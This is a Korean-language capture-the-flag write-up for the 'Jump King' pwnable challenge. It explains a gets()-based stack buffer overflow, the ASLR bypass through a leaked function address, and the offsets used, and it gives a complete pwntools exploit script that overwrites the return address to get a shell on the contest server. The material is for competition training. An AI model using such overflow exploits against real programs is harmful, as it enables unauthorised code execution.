# Jump King

#### Author : randN

#### Category : Pwnable

#### Description
```A student developed a jumping game based in a username and password. Can you get the final jump?```

<hr>

#### Write up
해당 문제는 jump_to_win이라는 바이너리와 개별 도커 인스턴스가 제공됩니다.

또한 Checksec을 사용하여 바이너리에서 어떤 보호기능이 활성화되어 있는지 확인할 수 있습니다.

<img width="1370" alt="Screen Shot 2021-12-18 at 5 13 39 PM" src="https://user-images.githubusercontent.com/84657474/146634478-7a73b03f-638f-48c7-818b-2c5f20511f38.png">

ASLR이 활성화되어 주소가 무작위로 지정되고 문제가 좀 더 어려워질 수 있습니다.

파일은 ELF이며, 해당 바이너리를 파악하기 위해 ida를 사용하였습니다.

<img width="1791" alt="Screen Shot 2021-12-18 at 5 47 11 PM" src="https://user-images.githubusercontent.com/84657474/146635296-a16a3399-b175-4d7d-b3aa-9497e4a3117c.png">
<img width="1791" alt="Screen Shot 2021-12-18 at 5 47 35 PM" src="https://user-images.githubusercontent.com/84657474/146635313-7888c03e-dd0d-4492-b20b-3a13fc3d5e3e.png">
<img width="1791" alt="Screen Shot 2021-12-18 at 5 47 44 PM" src="https://user-images.githubusercontent.com/84657474/146635325-b64304d5-e052-466f-a846-33bb7cbd9487.png">

ida 를 실행한 후 바이너리가 메인 실행을 시작하는 것을 볼 수 있습니다.

flag 변수가 0과 다르면 점프 함수를 호출하고 동일한 변수에 특정값인 16725가 있으면 점푸 함수가 vuln을 호출합니다.

/bin/sh를 사용하며 점프 함수도 vuln 함수 주소를 누출하고 있으므로 ASLR에 대한 걱정이 없었습니다.

두 입력 모두 버퍼 오버플로우에 취약하며, gets 함수때문에 EOF를 찾을때까지 입력을 읽을 것이라고 생각했습니다.

사용하는 변수의 크기가 32로 정의가 되어있었고 32를 초과하여 보내면 스택 위에 쓸 수 있습니다.

먼저 flag변수를 변경하고점프 함수를 호출하는 입력을 보내려고 합니다.

65개의 "A"를 보내면 flag값이 변경되지만 올바른 값으로 변경되지는 않습니다.

필요한 오프셋(64) 뒤에 16진수 값을 보내거나 동일한 값이 나오는 UA 문자를 보낼 수 있었습니다.

이제 두번째 입력에 액세스할 수 있습니다.

RBP 바로 뒤의 위치에 도달할 만큼 충분히 큰 오프셋을 보내면 되며, 취약한 주소가 있으므로 오프셋뒤에 쓰기만 하면 됩니다. 

필요한 오프셋을 찾기 위해 GEF를 사용했습니다.

<hr>

#### Exploit
<img width="1682" alt="Screen Shot 2021-12-18 at 6 23 20 PM" src="https://user-images.githubusercontent.com/84657474/146636227-8b6e7bf7-743e-417e-b5df-ae7bf9c0d5be.png">

```
from pwn import *

elf = context.binary = ELF("./jump_to_win")
rop = ROP(elf)
context.log_level = "DEBUG"

p = remote('ctf-metared-2021.ua.pt', 22592)

p.recvuntil(b' == Your username: \n')

first_payload = b'A' * 64 + b'UA'
p.sendline(first_payload)

p.recvline()
tmp = p.recvline()
vuln_address = tmp.decode().split(':')[1].strip().replace('\n', '')
second_payload = b'A' * 40 + p64(int(vuln_address, 0))

p.sendline(second_payload)
p.interactive()
p.close()
```

```CTFUA{Jump1ng_Ar0und_w1Th_aSlR}``` 
